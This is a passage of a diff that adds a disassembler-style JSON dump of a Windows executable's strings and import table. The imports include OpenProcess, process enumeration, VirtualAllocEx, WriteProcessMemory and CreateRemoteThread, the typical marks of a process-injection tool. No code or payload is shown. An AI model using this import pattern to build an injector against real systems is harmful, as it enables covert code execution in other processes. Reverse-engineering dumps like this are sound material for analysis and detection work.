+          "summary": ":GNU C99 16.1.0 ..u99 -fno-builtin"
+        },
+        {
+          "ea": 438003,
+          "summary": ".xdata$_ZNKSt9ty..ss_type_infoEPPv"
+        },
+        {
+          "ea": 437928,
+          "summary": ".text$_ZNKSt9typ..ss_type_infoEPPv"
+        },
+        {
+          "ea": 202156,
+          "summary": ";GNU C99 16.1.0 ..u99 -fno-builtin"
+        },
+        {
+          "ea": 232058,
+          "summary": "\nGNU C99 16.1.0 ..u99 -fno-builtin"
+        },
+        {
+          "ea": 170400,
+          "summary": "*GNU C99 16.1.0 ..u99 -fno-builtin"
+        },
+        {
+          "ea": 185122,
+          "summary": "\nGNU C99 16.1.0 ..u99 -fno-builtin"
+        },
+        {
+          "ea": 429909,
+          "summary": ".text$_ZNK10__cx..srcExPKvPKS0_S2_"
+        },
+        {
+          "ea": 513228,
+          "summary": "*GNU C99 16.1.0 ..u99 -fno-builtin"
+        },
+        {
+          "ea": 535023,
+          "summary": "\nGNU C99 16.1.0 ..u99 -fno-builtin"
+        },
+        {
+          "ea": 493068,
+          "summary": "?GNU C99 16.1.0 ..u99 -fno-builtin"
+        },
+        {
+          "ea": 229195,
+          "summary": "\nGNU C99 16.1.0 ..u99 -fno-builtin"
+        },
+        {
+          "ea": 221637,
+          "summary": ".GNU C99 16.1.0 ..u99 -fno-builtin"
+        },
+        {
+          "ea": 434828,
+          "summary": ".text$_ZL23__gxx..Unwind_Exception"
+        },
+        {
+          "ea": 156716,
+          "summary": "2GNU C99 16.1.0 ..u99 -fno-builtin"
+        },
+        {
+          "ea": 509565,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 512107,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 531912,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 176524,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 533543,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 520084,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 520233,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 531741,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 505608,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 525974,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 526124,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 188677,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 163258,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 534444,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 429192,
+          "summary": "_ZNK10__cxxabiv1..srcExPKvPKS0_S2_"
+        },
+        {
+          "ea": 507273,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 509414,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 166281,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 179891,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 526288,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 431361,
+          "summary": ".pdata$_ZNK10__c..St9type_infoPPvj"
+        },
+        {
+          "ea": 431287,
+          "summary": ".xdata$_ZNK10__c..St9type_infoPPvj"
+        },
+        {
+          "ea": 187005,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 538669,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 170242,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 434703,
+          "summary": "_ZL23__gxx_excep..Unwind_Exception"
+        },
+        {
+          "ea": 503677,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 508997,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 508843,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 512907,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 187507,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 513070,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 231747,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 526509,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 179356,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 220779,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 523142,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 188083,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 536674,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 179506,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 230025,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 152880,
+          "summary": "api-ms-win-crt-heap-l1-1-0.dll"
+        },
+        {
+          "ea": 534756,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 179670,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 532722,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 228386,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 519352,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 189290,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 167851,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 169853,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 215998,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 164616,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 230846,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 511567,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 214626,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 511718,
+          "summary": "GNU C99 16.1.0 -..u99 -fno-builtin"
+        },
+        {
+          "ea": 432945,
+          "summary": ".xdata$_ZL17pars..lsda_header_info"
+        },
+        {
+          "ea": 432876,
+          "summary": ".text$_ZL17parse..lsda_header_info"
+        },
+        {
+          "ea": 433015,
+          "summary": ".pdata$_ZL17pars..lsda_header_info"
+        },
+        {
+          "ea": 431214,
+          "summary": ".text$_ZNK10__cx..St9type_infoPPvj"
+        },
+        {
+          "ea": 437518,
+          "summary": "_ZNKSt9type_info..ss_type_infoEPPv"
+        },
+        {
+          "ea": 570880,
+          "summary": "D:\\W\\B\\src\\build-UCRT64"
+        },
+        {
+          "ea": 429704,
+          "summary": "_ZNK10__cxxabiv1..St9type_infoPPvj"
+        },
+        {
+          "ea": 431670,
+          "summary": "_ZL17parse_lsda_..lsda_header_info"
+        },
+        {
+          "ea": 432670,
+          "summary": ".text$_ZL20check..KSt9type_infoPvx"
+        },
+        {
+          "ea": 432738,
+          "summary": ".xdata$_ZL20chec..KSt9type_infoPvx"
+        },
+        {
+          "ea": 432807,
+          "summary": ".pdata$_ZL20chec..KSt9type_infoPvx"
+        },
+        {
+          "ea": 438721,
+          "summary": ".data$_ZZN9__gnu..EvE11terminating"
+        },
+        {
+          "ea": 431084,
+          "summary": ".xdata$_ZNK10__c.._upcastEPKS0_PPv"
+        },
+        {
+          "ea": 431149,
+          "summary": ".pdata$_ZNK10__c.._upcastEPKS0_PPv"
+        },
+        {
+          "ea": 438506,
+          "summary": "_ZZN9__gnu_cxx27..EvE11terminating"
+        },
+        {
+          "ea": 456030,
+          "summary": "__lib64_libapi_m..t_l1_1_0_a_iname"
+        },
+        {
+          "ea": 431020,
+          "summary": ".text$_ZNK10__cx.._upcastEPKS0_PPv"
+        },
+        {
+          "ea": 431608,
+          "summary": "_ZL20check_excep..KSt9type_infoPvx"
+        },
+        {
+          "ea": 633674,
+          "summary": "__lib64_libapi_m..t_l1_1_0_a_iname"
+        },
+        {
+          "ea": 441056,
+          "summary": ".text$_ZN9__gnu_..e_unlock_errorEv"
+        },
+        {
+          "ea": 631998,
+          "summary": "__lib64_libapi_m..e_l1_1_0_a_iname"
+        },
+        {
+          "ea": 429613,
+          "summary": "_ZNK10__cxxabiv1.._upcastEPKS0_PPv"
+        },
+        {
+          "ea": 566784,
+          "summary": "Subsystem"
+        },
+        {
+          "ea": 452791,
+          "summary": "__lib64_libapi_m..e_l1_1_0_a_iname"
+        },
+        {
+          "ea": 442477,
+          "summary": ".xdata$_ZN9__gnu..e_unlock_errorEv"
+        },
+        {
+          "ea": 632856,
+          "summary": "__lib64_libapi_m..e_l1_1_0_a_iname"
+        },
+        {
+          "ea": 454689,
+          "summary": "__lib64_libapi_m..e_l1_1_0_a_iname"
+        },
+        {
+          "ea": 127664,
+          "summary": "std::basic_strin..llocator<char> >"
+        },
+        {
+          "ea": 433832,
+          "summary": ".rdata$.refptr._..minate_handlerEv"
+        },
+        {
+          "ea": 443439,
+          "summary": ".text.startup._G.._cxx9__freeresEv"
+        },
+        {
+          "ea": 440235,
+          "summary": ".text$_ZNK9__gnu..ock_error4whatEv"
+        },
+        {
+          "ea": 440904,
+          "summary": ".text$_ZN9__gnu_..nce_lock_errorEv"
+        },
+        {
+          "ea": 441112,
+          "summary": "_ZN9__gnu_cxx32_..e_unlock_errorEv"
+        },
+        {
+          "ea": 455274,
+          "summary": "__lib64_libapi_m..y_l1_1_0_a_iname"
+        },
+        {
+          "ea": 441694,
+          "summary": ".xdata$_ZNK9__gn..ock_error4whatEv"
+        },
+        {
+          "ea": 442367,
+          "summary": ".xdata$_ZN9__gnu..nce_lock_errorEv"
+        },
+        {
+          "ea": 442534,
+          "summary": ".pdata$_ZN9__gnu..e_unlock_errorEv"
+        },
+        {
+          "ea": 443494,
+          "summary": ".xdata.startup._.._cxx9__freeresEv"
+        },
+        {
+          "ea": 443550,
+          "summary": ".pdata.startup._.._cxx9__freeresEv"
+        },
+        {
+          "ea": 458152,
+          "summary": "__lib64_libapi_m..e_l1_1_0_a_iname"
+        },
+        {
+          "ea": 456283,
+          "summary": "__lib64_libapi_m..t_l1_1_0_a_iname"
+        },
+        {
+          "ea": 631458,
+          "summary": "_head_lib64_liba..ronment_l1_1_0_a"
+        },
+        {
+          "ea": 452058,
+          "summary": "_head_lib64_liba..ronment_l1_1_0_a"
+        },
+        {
+          "ea": 631732,
+          "summary": "__lib64_libapi_m..g_l1_1_0_a_iname"
+        },
+        {
+          "ea": 452465,
+          "summary": "__lib64_libapi_m..g_l1_1_0_a_iname"
+        },
+        {
+          "ea": 634780,
+          "summary": "__lib64_libapi_m..e_l1_1_0_a_iname"
+        },
+        {
+          "ea": 440485,
+          "summary": ".text$_ZN9__gnu_..unlock_errorD1Ev"
+        },
+        {
+          "ea": 440958,
+          "summary": "_ZN9__gnu_cxx30_..nce_lock_errorEv"
+        },
+        {
+          "ea": 440133,
+          "summary": ".text$_ZNK9__gnu..ock_error4whatEv"
+        },
+        {
+          "ea": 441584,
+          "summary": ".xdata$_ZNK9__gn..ock_error4whatEv"
+        },
+        {
+          "ea": 441751,
+          "summary": ".pdata$_ZNK9__gn..ock_error4whatEv"
+        },
+        {
+          "ea": 440729,
+          "summary": ".text$_ZN9__gnu_..unlock_errorD0Ev"
+        },
+        {
+          "ea": 442422,
+          "summary": ".pdata$_ZN9__gnu..nce_lock_errorEv"
+        },
+        {
+          "ea": 633998,
+          "summary": "__lib64_libapi_m..p_l1_1_0_a_iname"
+        },
+        {
+          "ea": 633898,
+          "summary": "__lib64_libapi_m..o_l1_1_0_a_iname"
+        },
+        {
+          "ea": 454583,
+          "summary": "_pthread_get_sys..est_as_file_time"
+        },
+        {
+          "ea": 451247,
+          "summary": "_ZTSN9__gnu_cxx2..ce_unlock_errorE"
+        },
+        {
+          "ea": 135936,
+          "summary": "N9__gnu_cxx26__c..ce_unlock_errorE"
+        },
+        {
+          "ea": 456643,
+          "summary": "__lib64_libapi_m..p_l1_1_0_a_iname"
+        },
+        {
+          "ea": 451970,
+          "summary": "_ZTIN9__gnu_cxx2..ce_unlock_errorE"
+        },
+        {
+          "ea": 433684,
+          "summary": ".rdata$.refptr._..xpected_handlerE"
+        },
+        {
+          "ea": 452997,
+          "summary": "_ZTVN9__gnu_cxx2..ce_unlock_errorE"
+        },
+        {
+          "ea": 456482,
+          "summary": "__lib64_libapi_m..o_l1_1_0_a_iname"
+        },
+        {
+          "ea": 631334,
+          "summary": "__lib64_libapi_m..h_l1_1_0_a_iname"
+        },
+        {
+          "ea": 441910,
+          "summary": ".xdata$_ZN9__gnu..unlock_errorD1Ev"
+        },
+        {
+          "ea": 165093,
+          "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"
+        },
+        {
+          "ea": 630070,
+          "summary": "_head_lib64_liba..private_l1_1_0_a"
+        },
+        {
+          "ea": 634603,
+          "summary": "_head_lib64_liba..runtime_l1_1_0_a"
+        },
+        {
+          "ea": 441639,
+          "summary": ".pdata$_ZNK9__gn..ock_error4whatEv"
+        },
+        {
+          "ea": 453427,
+          "summary": "_head_lib64_liba..utility_l1_1_0_a"
+        },
+        {
+          "ea": 159848,
+          "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"
+        },
+        {
+          "ea": 457791,
+          "summary": "_head_lib64_liba..runtime_l1_1_0_a"
+        },
+        {
+          "ea": 535552,
+          "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"
+        },
+        {
+          "ea": 441963,
+          "summary": ".pdata$_ZN9__gnu..unlock_errorD1Ev"
+        },
+        {
+          "ea": 442118,
+          "summary": ".xdata$_ZN9__gnu..unlock_errorD0Ev"
+        },
+        {
+          "ea": 442171,
+          "summary": ".pdata$_ZN9__gnu..unlock_errorD0Ev"
+        },
+        {
+          "ea": 433577,
+          "summary": ".rdata$.refptr._..rminate_handlerE"
+        },
+        {
+          "ea": 537273,
+          "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"
+        },
+        {
+          "ea": 441507,
+          "summary": ".rdata$_ZTSN9__g..ce_unlock_errorE"
+        },
+        {
+          "ea": 454149,
+          "summary": "_head_lib64_liba.._locale_l1_1_0_a"
+        },
+        {
+          "ea": 632713,
+          "summary": "_head_lib64_liba.._string_l1_1_0_a"
+        },
+        {
+          "ea": 441162,
+          "summary": ".rdata$_ZTIN9__g..ce_unlock_errorE"
+        },
+        {
+          "ea": 440291,
+          "summary": "_ZNK9__gnu_cxx26..ock_error4whatEv"
+        },
+        {
+          "ea": 450116,
+          "summary": "_head_lib64_liba..private_l1_1_0_a"
+        },
+        {
+          "ea": 440341,
+          "summary": ".text$_ZN9__gnu_..e_lock_errorD1Ev"
+        },
+        {
+          "ea": 166730,
+          "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"
+        },
+        {
+          "ea": 440537,
+          "summary": "_ZN9__gnu_cxx26_..unlock_errorD1Ev"
+        },
+        {
+          "ea": 440583,
+          "summary": ".rdata$_ZTVN9__g..ce_unlock_errorE"
+        },
+        {
+          "ea": 440635,
+          "summary": ".text$_ZN9__gnu_..e_lock_errorD0Ev"
+        },
+        {
+          "ea": 632635,
+          "summary": "_head_lib64_liba.._locale_l1_1_0_a"
+        },
+        {
+          "ea": 440781,
+          "summary": "_ZN9__gnu_cxx26_..unlock_errorD0Ev"
+        },
+        {
+          "ea": 171193,
+          "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"
+        },
+        {
+          "ea": 127912,
+          "summary": "std::basic_iostr..r_traits<char> >"
+        },
+        {
+          "ea": 496468,
+          "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"
+        },
+        {
+          "ea": 232587,
+          "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"
+        },
+        {
+          "ea": 124514,
+          "summary": "%s\\tmp%lu.dat"
+        },
+        {
+          "ea": 134439,
+          "summary": "kernelbase.dll"
+        },
+        {
+          "ea": 630645,
+          "summary": "__imp__set_inval..arameter_handler"
+        },
+        {
+          "ea": 454427,
+          "summary": "_head_lib64_liba..convert_l1_1_0_a"
+        },
+        {
+          "ea": 222308,
+          "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"
+        },
+        {
+          "ea": 454299,
+          "summary": "_head_lib64_liba.._string_l1_1_0_a"
+        },
+        {
+          "ea": 132712,
+          "summary": "%d bit pseudo re..g the value %p.\n"
+        },
+        {
+          "ea": 514021,
+          "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"
+        },
+        {
+          "ea": 177181,
+          "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"
+        },
+        {
+          "ea": 507722,
+          "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"
+        },
+        {
+          "ea": 523799,
+          "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"
+        },
+        {
+          "ea": 506085,
+          "summary": "JOB_OBJECT_NET_R..OL_MAX_BANDWIDTH"
+        },
+        {
+          "ea": 127832,
+          "summary": "std::basic_ostre..r_traits<char> >"
+        },
+        {
+          "ea": 232670,
+          "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"
+        },
+        {
+          "ea": 441457,
+          "summary": ".rdata$_ZTSN9__g..ence_lock_errorE"
+        },
+        {
+          "ea": 632258,
+          "summary": "_head_lib64_liba..rt_heap_l1_1_0_a"
+        },
+        {
+          "ea": 453521,
+          "summary": "_head_lib64_liba..rt_heap_l1_1_0_a"
+        },
+        {
+          "ea": 441006,
+          "summary": ".rdata$_ZTIN9__g..ence_lock_errorE"
+        },
+        {
+          "ea": 232631,
+          "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"
+        },
+        {
+          "ea": 628050,
+          "summary": ".rdata$.refptr._..ve_startup_state"
+        },
+        {
+          "ea": 535596,
+          "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"
+        },
+        {
+          "ea": 577462,
+          "summary": "D:/W/B/src/mingw..ngw-w64-crt/misc"
+        },
+        {
+          "ea": 523882,
+          "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"
+        },
+        {
+          "ea": 523843,
+          "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"
+        },
+        {
+          "ea": 177264,
+          "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"
+        },
+        {
+          "ea": 577206,
+          "summary": "D:/W/B/src/mingw..ngw-w64-crt/misc"
+        },
+        {
+          "ea": 441808,
+          "summary": ".xdata$_ZN9__gnu..e_lock_errorD1Ev"
+        },
+        {
+          "ea": 535635,
+          "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"
+        },
+        {
+          "ea": 443401,
+          "summary": ".pdata$__cxa_fre..endent_exception"
+        },
+        {
+          "ea": 442016,
+          "summary": ".xdata$_ZN9__gnu..e_lock_errorD0Ev"
+        },
+        {
+          "ea": 443363,
+          "summary": ".xdata$__cxa_fre..endent_exception"
+        },
+        {
+          "ea": 455151,
+          "summary": "_head_lib64_liba..t_stdio_l1_1_0_a"
+        },
+        {
+          "ea": 507805,
+          "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"
+        },
+        {
+          "ea": 453999,
+          "summary": "_ZTIN9__gnu_cxx2..ence_lock_errorE"
+        },
+        {
+          "ea": 507766,
+          "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"
+        },
+        {
+          "ea": 222352,
+          "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"
+        },
+        {
+          "ea": 171237,
+          "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"
+        },
+        {
+          "ea": 222391,
+          "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"
+        },
+        {
+          "ea": 166813,
+          "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"
+        },
+        {
+          "ea": 135872,
+          "summary": "N9__gnu_cxx24__c..ence_lock_errorE"
+        },
+        {
+          "ea": 166774,
+          "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"
+        },
+        {
+          "ea": 426920,
+          "summary": ".rdata$.refptr._..ve_startup_state"
+        },
+        {
+          "ea": 496512,
+          "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"
+        },
+        {
+          "ea": 297996,
+          "summary": "D:/W/B/src/mingw..w-w64-crt/libsrc"
+        },
+        {
+          "ea": 127752,
+          "summary": "std::basic_istre..r_traits<char> >"
+        },
+        {
+          "ea": 171276,
+          "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"
+        },
+        {
+          "ea": 168460,
+          "summary": "\tJOB_OBJECT_NET_..OL_MAX_BANDWIDTH"
+        },
+        {
+          "ea": 575797,
+          "summary": "D:/W/B/src/mingw..ngw-w64-crt/misc"
+        },
+        {
+          "ea": 447334,
+          "summary": ".rdata$.refptr._..RELOC_LIST_END__"
+        },
+        {
+          "ea": 165137,
+          "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"
+        },
+        {
+          "ea": 165176,
+          "summary": "JOB_OBJECT_NET_R..TROL_VALID_FLAGS"
+        },
+        {
+          "ea": 159892,
+          "summary": "JOB_OBJECT_NET_R..CONTROL_DSCP_TAG"
+        },
+        {
+          "ea": 440435,
+          "summary": ".rdata$_ZTVN9__g..ence_lock_errorE"
+        },
+        {
+          "ea": 440391,
+          "summary": "_ZN9__gnu_cxx24_..e_lock_errorD1Ev"
+        },
+        {
+          "ea": 440187,
+          "summary": "_ZNK9__gnu_cxx24..ock_error4whatEv"
+        }
+      ],
+      "imports": [
+        {
+          "ea": 473376,
+          "name": "kernel32.CloseHandle",
+          "type": "IMPORT",
+          "num_refs": 4
+        },
+        {
+          "ea": 473384,
+          "name": "kernel32.CreateFileW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473392,
+          "name": "kernel32.CreateRemoteThread",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 473400,
+          "name": "kernel32.CreateToolhelp32Snapshot",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473408,
+          "name": "kernel32.DeleteCriticalSection",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473416,
+          "name": "kernel32.DeleteFileW",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 473424,
+          "name": "kernel32.EnterCriticalSection",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 473432,
+          "name": "kernel32.GetCurrentDirectoryW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473440,
+          "name": "kernel32.GetLastError",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 473448,
+          "name": "kernel32.GetModuleHandleA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473456,
+          "name": "kernel32.GetProcAddress",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473464,
+          "name": "kernel32.GetStartupInfoA",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473472,
+          "name": "kernel32.GetTempFileNameW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473480,
+          "name": "kernel32.GetTempPathW",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473488,
+          "name": "kernel32.GetTickCount",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473496,
+          "name": "kernel32.InitializeCriticalSection",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473504,
+          "name": "kernel32.IsDBCSLeadByte",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473512,
+          "name": "kernel32.LeaveCriticalSection",
+          "type": "IMPORT",
+          "num_refs": 3
+        },
+        {
+          "ea": 473520,
+          "name": "kernel32.OpenProcess",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 473528,
+          "name": "kernel32.Process32First",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473536,
+          "name": "kernel32.Process32Next",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473544,
+          "name": "kernel32.SetUnhandledExceptionFilter",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473552,
+          "name": "kernel32.Sleep",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473560,
+          "name": "kernel32.TlsGetValue",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473568,
+          "name": "kernel32.VirtualAllocEx",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473576,
+          "name": "kernel32.VirtualFreeEx",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473584,
+          "name": "kernel32.VirtualProtect",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 473592,
+          "name": "kernel32.VirtualQuery",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473600,
+          "name": "kernel32.WaitForSingleObject",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473608,
+          "name": "kernel32.WriteFile",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473616,
+          "name": "kernel32.WriteProcessMemory",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 473632,
+          "name": "api-ms-win-crt-environment-l1-1-0.__p__environ",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 473648,
+          "name": "api-ms-win-crt-heap-l1-1-0._set_new_mode",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 473656,
+          "name": "api-ms-win-crt-heap-l1-1-0.calloc",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473664,
+          "name": "api-ms-win-crt-heap-l1-1-0.free",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473672,
+          "name": "api-ms-win-crt-heap-l1-1-0.malloc",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473688,
+          "name": "api-ms-win-crt-locale-l1-1-0._configthreadlocale",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 473704,
+          "name": "api-ms-win-crt-math-l1-1-0.__setusermatherr",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 473720,
+          "name": "api-ms-win-crt-private-l1-1-0.memcpy",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 473736,
+          "name": "api-ms-win-crt-runtime-l1-1-0.__p___argc",
+          "type": "IMPORT",
+          "num_refs": 2
+        },
+        {
+          "ea": 473744,
+          "name": "api-ms-win-crt-runtime-l1-1-0.__p___argv",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473752,
+          "name": "api-ms-win-crt-runtime-l1-1-0.__p__acmdln",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473760,
+          "name": "api-ms-win-crt-runtime-l1-1-0._cexit",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473768,
+          "name": "api-ms-win-crt-runtime-l1-1-0._configure_narrow_argv",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473776,
+          "name": "api-ms-win-crt-runtime-l1-1-0._crt_atexit",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473784,
+          "name": "api-ms-win-crt-runtime-l1-1-0._exit",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473792,
+          "name": "api-ms-win-crt-runtime-l1-1-0._initialize_narrow_environment",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473800,
+          "name": "api-ms-win-crt-runtime-l1-1-0._seh_filter_exe",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473808,
+          "name": "api-ms-win-crt-runtime-l1-1-0._initterm",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473816,
+          "name": "api-ms-win-crt-runtime-l1-1-0._initterm_e",
+          "type": "IMPORT",
+          "num_refs": 1
+        },
+        {
+          "ea": 473824,
